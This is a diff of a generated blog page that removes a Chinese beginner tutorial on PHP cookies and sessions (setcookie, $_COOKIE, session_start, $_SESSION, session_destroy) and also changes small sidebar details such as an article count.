-              <time title="Erstellt: 2019-02-27 16:29:12 / Geändert am: 17:51:30" itemprop="dateCreated datePublished" datetime="2019-02-27T16:29:12+08:00">2019-02-27</time>
-            </span>
-          
-
-          
-            
-
-            
-          
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          <br>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>关于cookie以及sesssion的知识点，我总结在另一篇博客里。</p>
-<h1 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h1><p>cookie常用来识别用户。</p>
-<h2 id="如何创建Cookie"><a href="#如何创建Cookie" class="headerlink" title="如何创建Cookie?"></a>如何创建Cookie?</h2><p>setcookie() 函数用于设置 cookie。</p>
-<p><strong>注释：</strong>：setcookie() 函数必须位于 <html> 标签之前。</html></p>
-<p>语法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain);</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">实例一</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"runoob"</span>, time()+<span class="number">3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">....</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">实例二</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$expire=time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"runoob"</span>, $expire);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure>
-<p>在上面的实例中，过期时间被设置为一个月（60 秒 <em> 60 分 </em> 24 小时 * 30 天）。</p>
-<h2 id="如何取回Cookie值"><a href="#如何取回Cookie值" class="headerlink" title="如何取回Cookie值"></a>如何取回Cookie值</h2><p>这里使用到一个PHP的超级全局变量$_COOKIE</p>
-<p>PHP 的 $_COOKIE 变量用于取回 cookie 的值</p>
-<p>在下面的实例中，我们取回了名为”user”的cookie值，并把它显示在页面上：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出 cookie 值</span></span><br><span class="line"><span class="keyword">echo</span> $_COOKIE[<span class="string">"user"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看所有 cookie</span></span><br><span class="line">print_r($_COOKIE);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在下面的实例中，我们使用 isset() 函数来确认是否已设置了 cookie：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"user"</span>]))</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"欢迎 "</span> . $_COOKIE[<span class="string">"user"</span>] . <span class="string">"!&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"普通访客!&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<h2 id="如何删除-Cookie"><a href="#如何删除-Cookie" class="headerlink" title="如何删除 Cookie"></a>如何删除 Cookie</h2><p>当删除 cookie 时，您应当使过期日期变更为过去的时间点。</p>
-<p>删除的实例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 设置 cookie 过期时间为过去 1 小时</span></span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">""</span>, time()<span class="number">-3600</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>总结：所有的操作基本都与setcookie(),这个函数有关。</p>
-<h1 id="PHP-session"><a href="#PHP-session" class="headerlink" title="PHP session"></a>PHP session</h1><h2 id="开始-PHP-Session"><a href="#开始-PHP-Session" class="headerlink" title="开始 PHP Session"></a>开始 PHP Session</h2><p>session_start()函数</p>
-<p>在您把用户信息存储到 PHP session 中之前，<strong>首先必须启动会话。</strong></p>
-<p><strong>注释</strong>：session_start() 函数必须位于 <html> 标签之前：</html></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>上面的代码会向服务器注册用户的会话，以便您可以开始保存用户信息，同时会为用户会话分配一个 UID。</p>
-<p>参考文章：<br><a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376" target="_blank" rel="noopener">https://blog.csdn.net/zhengxijia2012/article/details/73437376</a></p>
-<h2 id="存储-Session-变量"><a href="#存储-Session-变量" class="headerlink" title="存储 Session 变量"></a>存储 Session 变量</h2><p>引入另外一个超全局变量$_SESSION。</p>
-<p>存储和取回 session 变量的正确方法是使用 PHP $_SESSION 变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">// 存储 session 数据</span></span><br><span class="line">$_SESSION[<span class="string">'views'</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检索 session 数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"浏览量："</span>. $_SESSION[<span class="string">'views'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-<p>输出：1</p>
-<p>在下面的实例中，我们创建了一个简单的 page-view 计数器。isset() 函数检测是否已设置 “views” 变量。如果已设置 “views” 变量，我们累加计数器。如果 “views” 不存在，则创建 “views” 变量，并把它设置为 1：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'views'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[<span class="string">'views'</span>]=$_SESSION[<span class="string">'views'</span>]+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[<span class="string">'views'</span>]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"浏览量："</span>. $_SESSION[<span class="string">'views'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="销毁-Session"><a href="#销毁-Session" class="headerlink" title="销毁 Session"></a>销毁 Session</h2><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>
-<p>unset() 函数用于释放指定的 session 变量：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'views'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION[<span class="string">'views'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>也可以通过调用 session_destroy() 函数彻底销毁 session：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_destroy();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>注释：</strong>session_destroy() 将重置 session，您将失去所有已存储的 session 数据。</p>
-
-          
+          <!--/noindex-->
         
       
     </div>
@@ -2105,6 +1950,8 @@
 
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
   
+    <img class="site-author-image" itemprop="image" src="/images/name.png" alt="cookie">
+  
   <p class="site-author-name" itemprop="name">cookie</p>
   <div class="site-description motion-element" itemprop="description"></div>
 </div>
@@ -2116,7 +1963,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">Artikel</span>
         </a>
       </div>
@@ -2200,6 +2047,8 @@
     
       <div class="back-to-top">
         <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
         
       </div>
     
